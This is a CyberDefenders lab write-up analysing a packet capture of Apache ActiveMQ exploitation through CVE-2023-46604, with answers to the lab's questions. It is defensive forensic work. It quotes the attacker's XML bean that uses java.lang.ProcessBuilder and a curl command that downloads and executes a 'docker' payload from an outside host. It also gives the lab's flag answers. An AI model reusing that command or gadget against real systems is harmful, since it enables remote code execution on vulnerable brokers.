# OpenWire Lab Write Up
**Platform:** CyberDefenders

---

## Scenario
During your shift as a tier-2 SOC analyst, you receive an escalation from a tier-1 analyst regarding a public-facing server. This server has been flagged for making outbound connections to multiple suspicious IPs. In response, you initiate the standard incident response protocol, which includes isolating the server from the network to prevent potential lateral movement or data exfiltration and obtaining a packet capture from the NSM utility for analysis. Your task is to analyze the pcap and assess for signs of malicious activity.

---

## Objective
Investigate a Java deserialization vulnerability in Apache ActiveMQ that enables remote code execution through insecure class loading.<br><br>
**Category:** Network Forensics <br>
**Difficulty:** Medium <br>

---
## Investigation Scope

This investigation focuses on analyzing the network evidence provided in
the CyberDefenders OpenWire lab to reconstruct suspected exploitation of
Apache ActiveMQ through a Java deserialization vulnerability associated
with remote code execution.

The investigation covers:

- Identifying the affected server, suspected attack source, exposed
  services, and relevant network conversations.
- Examining suspicious ActiveMQ/OpenWire exchanges for indicators of
  exploitation and identifying the applicable vulnerability where
  supported by service information and payload evidence.
- Identifying externally referenced resources, payload URLs, filenames,
  and embedded commands within the captured traffic.
- Recovering available transferred content and examining its role in
  payload delivery or execution.
- Correlating exploitation attempts, resource retrieval, execution
  indicators, and potential command-and-control connections.
- Building an evidence-supported timeline and documenting relevant
  indicators and MITRE ATT&CK mappings.

---

## Environment

### Analysis Setup
- **Host operating system:** Fedora Linux 44
- **Analysis operating system:** Kali Linux
- **Virtualization platform:** Oracle VirtualBox

### Analysis Tools & Tactics
- **Tools:** Wireshark, Zui, Network Miner
- **Tactics:** Initial Access, Execution, Command and Control

### Artifacts
The analysis uses one provided artifact:

- `c119-OpenWire.pcapng` - network traffic associated with the incident.

---

## Investigations
**Q1. By identifying the C2 IP, we can block traffic to and from this IP, helping to contain the breach and prevent further data exfiltration or command execution. Can you provide the IP of the C2 server that communicated with our server?**

**Steps taken:**

1. Opened **Statistics -> Conversations -> IPv4** in Wireshark.
2. Identified the conversation between `146.190.21.92` and the investigated server, `134.209.197.3`.
3. Applied a directional filter to inspect packets originating from `146.190.21.92`.
4. Examined the OpenWire traffic and HTTP responses associated with this endpoint.

**Filter:**

```wireshark
ip.src == 146.190.21.92 && ip.dst == 134.209.197.3
```

**Evidence:**

- The IPv4 conversation statistics show **4,867 packets** exchanged between `146.190.21.92` and `134.209.197.3`.
- Packet **1** shows `146.190.21.92` initiating a TCP connection to destination port **61616** on the investigated server.
- Packet **5** contains an OpenWire message displayed as:

  ```text
  ExceptionResponse [Malformed Packet]
  ```

- Packets **14** and **24** show HTTP `200 OK` responses from the same remote IP, associated with source port **8000**.
- These views identify the endpoint and its communications. Inspecting the payloads and subsequent sessions would further substantiate its C2 role.

**Supporting Screenshots:**
<img width="1339" height="267" alt="image" src="https://github.com/user-attachments/assets/fb341f3a-1742-4ba7-8ca5-49aafd35fd89" />
<img width="1608" height="319" alt="image" src="https://github.com/user-attachments/assets/f6d1739e-d66e-4344-ba31-bf020e457256" />

**Flag:** `146.190.21.92`

**Q2. Initial entry points are critical to trace the attack vector back. What is the port number of the service the adversary exploited?**

**Steps taken:**

1. Filtered traffic from `146.190.21.92` to the investigated server, `134.209.197.3`.
2. Selected **packet 5**, which Wireshark identifies as an OpenWire message.
3. Expanded **Transmission Control Protocol** and inspected the **Destination Port** field.

**Filter:**

```wireshark
ip.src == 146.190.21.92 && ip.dst == 134.209.197.3
```

**Evidence:**

- Packet **5** shows the following connection details:

  ```text
  Source IP:        146.190.21.92
  Source Port:      47284
  Destination IP:   134.209.197.3
  Destination Port: 61616
  ```

- The packet belongs to **TCP stream 0** and contains an OpenWire message displayed as `ExceptionResponse [Malformed Packet]`.
- The destination port identifies the targeted service as **TCP 61616**.

**Supporting Screenshots:**
<img width="1607" height="957" alt="image" src="https://github.com/user-attachments/assets/ae468764-025c-40f1-9dbc-26cc745d08dc" />

**Flag:** `61616`

**Q3. Following up on the previous question, what is the name of the service found to be vulnerable?**

**Steps taken:**

1. Applied the `openwire` display filter in Wireshark.
2. Selected **packet 4**, sent from the investigated server, `134.209.197.3`.
3. Expanded **OpenWire -> WireFormatInfo** and inspected the **Magic** field.
4. Identified `ActiveMQ` in the protocol handshake, corresponding to **Apache ActiveMQ**.

**Filter:**

```wireshark
openwire
```

**Evidence:**

- Packet **4** contains the server’s OpenWire handshake:

  ```text
  Source IP: 134.209.197.3
  Command:   WireFormatInfo (1)
  Magic:     ActiveMQ
  ```

- The `ActiveMQ` identifier supports identifying the service on the previously established TCP port **61616** as **Apache ActiveMQ**.
- The supplied search-result screenshot corroborates the full product name.

**Supporting Screenshots:**
<img width="1607" height="957" alt="image" src="https://github.com/user-attachments/assets/23b79684-b825-4cae-ae7a-f956618dd571" />
<img width="764" height="505" alt="image" src="https://github.com/user-attachments/assets/da053b5c-942f-4081-a520-247ae5949a8a" />

**Flag:** `Apache ActiveMQ`

**Q4. The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server?**

**Steps taken:**

1. Opened **Statistics -> Endpoints -> IPv4** in Wireshark.
2. Identified `128.199.52.72` as an additional endpoint communicating with the investigated server.
3. Applied an IP address filter to inspect this communication.
4. Located the server’s HTTP request for `/docker` and the corresponding response.

**Filter:**

```wireshark
ip.addr == 128.199.52.72
```

**Evidence:**

- The IPv4 endpoint statistics show **10 packets** associated with `128.199.52.72`.
- Packet **34** shows the investigated server requesting a resource from this endpoint:

  ```text
  Source IP:        134.209.197.3
  Destination IP:   128.199.52.72
  Destination Port: 80
  Request:          GET /docker HTTP/1.1
  ```

- Packet **38** contains an `HTTP/1.0 200 OK` response from `128.199.52.72`.
- This exchange establishes the endpoint’s role in serving the `/docker` resource during the investigated activity.

**Supporting Screenshots:**
<img width="1185" height="211" alt="image" src="https://github.com/user-attachments/assets/baa7e6d3-9e4f-4667-a7de-9be144aa5f9f" />
<img width="1588" height="292" alt="image" src="https://github.com/user-attachments/assets/4908d173-9372-4d31-8ec0-02da1226172d" />

**Flag:** `128.199.52.72`

**Q5. Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?**

**Steps taken:**

1. Filtered HTTP responses from `146.190.21.92` to the investigated server.
2. Followed the TCP stream containing the request for `/invoice.xml`.
3. Inspected the returned XML and identified the download command’s output filename.

**Filter:**

```wireshark
ip.src == 146.190.21.92 && ip.dst == 134.209.197.3 && http
```

**Evidence:**

- The investigated server requests the XML resource:

  ```http
  GET /invoice.xml HTTP/1.1
  Host: 146.190.21.92:8000
  ```

- The HTTP `200 OK` response contains XML defining a `java.lang.ProcessBuilder` bean with `init-method="start"`.
- The download portion of its command is:

  ```bash
  curl -s -o /tmp/docker http://128.199.52.72/docker
  ```

- The `-o /tmp/docker` argument identifies the intended output file as **docker**, matching the resource requested from the second endpoint in Q4.
- The XML establishes the intended filename; the screenshots do not independently confirm the file’s presence on disk or successful execution.

**Supporting Screenshots:**
<img width="1047" height="187" alt="Q5-1   Q6-1" src="https://github.com/user-attachments/assets/16cfccd6-8312-43d1-8682-191c7322a961" />
<img width="1002" height="559" alt="image" src="https://github.com/user-attachments/assets/69a0bb36-45b5-4e7f-b165-2ada7b937075" />

**Flag:** `docker`

**Q6. What Java class was invoked by the XML file to run the exploit?**

**Steps taken:**

1. Filtered HTTP responses from `146.190.21.92` to the investigated server.
2. Followed the TCP stream containing `/invoice.xml`.
3. Inspected the XML’s `<bean>` declaration and identified its `class` attribute.

**Filter:**

```wireshark
ip.src == 146.190.21.92 && ip.dst == 134.209.197.3 && http
```

**Evidence:**

- The response to `GET /invoice.xml` contains this bean declaration:

  ```xml
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
  ```

- The `class` attribute explicitly specifies **java.lang.ProcessBuilder**.
- The declaration sets `init-method="start"` and supplies constructor arguments containing `bash`, `-c`, and the payload’s shell command. This documents the XML’s process-launch configuration.

**Supporting Screenshots:**
<img width="1047" height="187" alt="Q5-1   Q6-1" src="https://github.com/user-attachments/assets/5523b20e-58af-46cd-97d5-c4e442b0c061" />
<img width="1002" height="559" alt="Q6-2" src="https://github.com/user-attachments/assets/06039164-e64c-4993-b062-df8bf36ca2bf" />

**Flag:** `java.lang.ProcessBuilder`

**Q7. To better understand the specific security flaw exploited, can you identify the CVE identifier associated with this vulnerability?**

**Steps taken:**

1. Reviewed the previously identified Apache ActiveMQ service and suspicious OpenWire traffic.
2. Examined the search result for Apache ActiveMQ OpenWire vulnerabilities.
3. Verified the vulnerability’s identifier and exploitation mechanism against Apache’s official advisory.
4. Correlated the advisory with the retrieval of `invoice.xml` and its process-launch configuration.

**Search query:**

```text
apache activemq openwire cve
```

**Evidence:**

- The supplied search result identifies Apache’s advisory titled **Update on CVE-2023-46604**.
- The advisory describes remote code execution in the **Java OpenWire protocol marshaller**, involving manipulation of serialized class types.
- Apache explains that `ClassPathXmlApplicationContext` can be used to load a malicious XML application configuration over HTTP.
- This mechanism is consistent with the previously observed OpenWire message, retrieval of `/invoice.xml`, and XML declaration of `java.lang.ProcessBuilder` with `init-method="start"`.

**Supporting Screenshots:**
<img width="1002" height="237" alt="image" src="https://github.com/user-attachments/assets/9ab14d7c-a694-4b6a-a712-0facceb1c13e" />

**Flag:** `CVE-2023-46604`

**Q8. The vendor addressed the vulnerability by adding a validation step to ensure that only valid `Throwable` classes can be instantiated, preventing exploitation. In which Java class and method was this validation step added?**

**Steps taken:**

1. Opened the supplied Apache ActiveMQ fix commit.
2. Located the changes to `BaseDataStreamMarshaller.java`.
3. Inspected the `createThrowable(String className, String message)` method.
4. Identified the validation call added before constructor lookup and object instantiation.

**Code location:**

```text
activemq-client/src/main/java/org/apache/activemq/openwire/v1/BaseDataStreamMarshaller.java
```

**Evidence:**

- The modified class is **BaseDataStreamMarshaller**.
- The validation call was added inside **createThrowable**:

  ```java
  OpenWireUtil.validateIsThrowable(clazz);
  ```

- The helper checks `Throwable.class.isAssignableFrom(clazz)` and rejects incompatible classes with an `IllegalArgumentException`.
- `OpenWireUtil.validateIsThrowable` implements the check; **BaseDataStreamMarshaller.createThrowable** is the location where that check was inserted into the object-creation flow.

**Supporting Screenshots:**
<img width="1084" height="512" alt="image" src="https://github.com/user-attachments/assets/6e35cafd-a6af-40f6-89fc-268c8610649d" />

**Flag:** `BaseDataStreamMarshaller.createThrowable`

---

## Findings

The reviewed evidence reconstructs an exploitation chain targeting **Apache ActiveMQ** on **134.209.197.3:61616**. The server advertises provider version **5.18.0**. A crafted OpenWire message from **146.190.21.92** references a Spring XML-loading class and `http://146.190.21.92:8000/invoice.xml`. The server subsequently retrieves XML that configures `java.lang.ProcessBuilder` to launch `bash -c` and download a file named **docker** from **128.199.52.72**.

The subsequent HTTP request for `/docker` matches the download target embedded in the XML. This correlation supports execution of the download stage following exploitation. The reviewed screenshots do not independently establish the final payload's execution, an interactive reverse shell, or data exfiltration.

The two addresses identified as C2 infrastructure in the lab have distinct observed roles: **146.190.21.92** originates the exploit and hosts the XML; **128.199.52.72** serves the next resource. These roles are supported by packet contents and request-response direction.

### Key Findings

| Area | Finding | Evidence |
|---|---|---|
| Targeted service | `134.209.197.3` exposes the investigated OpenWire service on TCP **61616**. Its handshake identifies ActiveMQ and advertises provider version **5.18.0**. | Q2–Q3: packet **4** WireFormatInfo and packet **5** destination port. |
| Exploit source | `146.190.21.92` initiates the connection and sends a crafted OpenWire `ExceptionResponse` containing a Spring class name and remote XML URL. | Q1–Q2: packets **1** and **5**, TCP stream **0**. |
| Remote XML retrieval | The server requests `/invoice.xml` from `146.190.21.92:8000`. The returned HTTP stream contains a Spring bean configuration. | Q5–Q6: HTTP stream and `200 OK` responses in packets **14** and **24**. |
| Process-launch configuration | The XML defines a `java.lang.ProcessBuilder` bean with `init-method="start"` and constructor arguments containing `bash`, `-c`, and a download-and-launch command. | Q6: XML response body. |
| Secondary payload endpoint | The investigated server requests `/docker` from `128.199.52.72:80` and receives an HTTP `200 OK` response. | Q4: packets **31**, **34**, and **38**. |
| Intended payload filename | The command's `curl -o` argument specifies `/tmp/docker`; the lab identifies **docker** as the reverse-shell payload name. | Q5: XML command and the matching `/docker` request in Q4. |
| Vulnerability correlation | The advertised version, crafted OpenWire message, and remote Spring XML loading are consistent with **CVE-2023-46604**. | Q7: packet evidence correlated with Apache's advisory. |
| Vendor fix | The patch adds a call to `OpenWireUtil.validateIsThrowable(clazz)` inside **BaseDataStreamMarshaller.createThrowable**, before reflective constructor lookup and instantiation. | Q8: Apache PR **1098**, commit **3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b**. |

### Activity Timeline

| Capture-relative time (seconds) | Packet(s) | Observed activity |
|---|---|---|
| `0.000000` | **1** | `146.190.21.92:47284` sends a TCP SYN to `134.209.197.3:61616`. |
| `0.128779` | **4** | The server sends OpenWire WireFormatInfo identifying ActiveMQ, with provider version **5.18.0** visible in the packet bytes. |
| `0.130568` | **5** | The remote endpoint sends the crafted OpenWire message referencing `ClassPathXmlApplicationContext` and the `/invoice.xml` URL. |
| `0.143668`, `0.149122` | **14**, **24** | HTTP `200 OK` responses arrive from `146.190.21.92`. The documented stream shows the requested XML configuration. |
| `0.185236` | **31** | `134.209.197.3:46158` initiates a TCP connection to `128.199.52.72:80`. |
| `0.189819` | **34** | The investigated server sends `GET /docker HTTP/1.1`, matching the XML's download target. |
| `0.192218` | **38** | `128.199.52.72` returns `HTTP/1.0 200 OK`. |

---

## Indicators

### Attack Indicators and Artifacts

| Type | Value | Context |
|---|---|---|
| Exploit source / XML host | `146.190.21.92` | Source of the crafted OpenWire message and the HTTP XML responses, identified as the first C2 address in Q1. |
| XML hosting service | `146.190.21.92:8000` | Host and port requested by the investigated Java client. |
| XML payload URL | `http://146.190.21.92:8000/invoice.xml` | Referenced in the OpenWire payload and retrieved by the server. |
| XML filename | `invoice.xml` | Contains the malicious Spring bean configuration. |
| Secondary payload host | `128.199.52.72` | Destination of the matching `/docker` request, identified as the second C2 address in Q4. |
| Secondary payload URL | `http://128.199.52.72/docker` | Download target embedded in the XML command. |
| Intended download path | `/tmp/docker` | Output path supplied to `curl -o`. |
| Final invocation in XML | `./tmp/docker` | Relative command path, preserved exactly as displayed. |
| XML-loading class | `org.springframework.context.support.ClassPathXmlApplicationContext` | Class name embedded in the crafted OpenWire message. |
| Process-launch class | `java.lang.ProcessBuilder` | Bean class in the returned XML, configured with `init-method="start"`. |
| Shell arguments | `bash`, `-c` | Constructor arguments preceding the shell command. |
| Associated vulnerability | `CVE-2023-46604` | Vendor-documented OpenWire remote code execution vulnerability matching the investigated chain. |

**Observed XML bean declaration:**

```xml
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
```

**Shell command embedded in the XML, preserved exactly:**

```bash
curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker
```

The configuration specifies a download, a permission change, and a launch attempt. The correlated network request supports initiation of the download; outcomes of the later command stages remain unverified.

### Investigation Context

| Entity | Value | Role |
|---|---|---|
| Investigated server | `134.209.197.3` | Receives the OpenWire message and initiates the XML and secondary resource requests. |
| Targeted service | `Apache ActiveMQ` | Product identified by the server's WireFormatInfo message. |
| Advertised provider version | `5.18.0` | Visible in the server's handshake bytes. |
| Target service port | `TCP 61616` | Destination port of the crafted OpenWire message. |
| XML request User-Agent | `Java/11.0.21` | Client-reported runtime string in the HTTP stream; not proof of the server operating system. |
| XML HTTP server banner | `SimpleHTTP/0.6 Python/3.8.10` | Advertised by the remote XML host; not the software running the targeted broker. |
| Patched method | `BaseDataStreamMarshaller.createThrowable` | Location where the Throwable validation call was inserted. |
| Validation helper | `OpenWireUtil.validateIsThrowable` | Checks class compatibility with `Throwable` before reflective instantiation. |

---

## Lessons Learned

- **Trace the chain across protocols.** The OpenWire class name and URL connect the initial message to the HTTP XML response; the XML's embedded URL connects that response to the subsequent download. 
- **Validate remote types before invoking constructors.** The [vendor patch](https://github.com/apache/activemq/pull/1098/commits/3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b) checks whether the class can be assigned to `Throwable` before construction. Validation after a constructor with side effects has already run would not protect that step.
- **Patch brokers and Java OpenWire clients.** Apache's [advisory](https://activemq.apache.org/news/cve-2023-46604) identifies exposure on both sides of an OpenWire connection. Apply a vendor-supported release containing the fix and inventory Java OpenWire dependencies as part of the response.
- **Limit broker exposure and outbound reachability.** Restrict TCP **61616** to required peers and review the broker host's ability to retrieve arbitrary external resources. In this case, external HTTP access links the initial message to the later payload request.
- **Correlate network and process telemetry.** Investigate Java spawning `bash`, followed by `curl` and a newly downloaded program. Confirm the process tree, working directory, command outcomes, and file hashes before concluding that the final payload executed.
- **Preserve exact syntax and evidence provenance.** Keep the relative `./tmp/docker` path, distinguish provider and protocol versions, and retain original packet times and HTTP headers without treating them as interchangeable timestamps.

Further investigation should recover and hash the complete `/docker` response, examine its contents, and correlate broker logs, process telemetry, and filesystem records for the incident interval. Review all subsequent connections involving the affected server and both remote endpoints to determine whether a reverse shell, additional payloads, or data transfer followed. Assess the third external peer visible in the conversation summary according to its own traffic rather than assigning it an attack role from its presence alone.

Response priorities are to preserve the capture and relevant host evidence, restrict communication with the identified attack infrastructure, contain the affected broker host as warranted, and patch exposed brokers and clients. Check other reachable OpenWire services for the same class-loading pattern and investigate any confirmed post-exploitation activity before deciding the recovery scope.

---

## References

- [Apache ActiveMQ — Official Website](https://activemq.apache.org/): product identification; the website shown in the supplied service-name search result.
- [Apache ActiveMQ — Update on CVE-2023-46604](https://activemq.apache.org/news/cve-2023-46604): advisory shown in the supplied CVE search result, including OpenWire class loading and remote XML configuration.
- [Apache ActiveMQ — CVE-2023-46604 Security Advisory](https://activemq.apache.org/security-advisories.data/CVE-2023-46604): affected versions, fixed release points, and vulnerability description.
- [Apache ActiveMQ — PR 1098, Commit 3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b](https://github.com/apache/activemq/pull/1098/commits/3eaf3107f4fb9a3ce7ab45c175bfaeac7e866d5b): exact GitHub link supplied in Q8, validation call in `BaseDataStreamMarshaller.createThrowable` and its helper implementation.
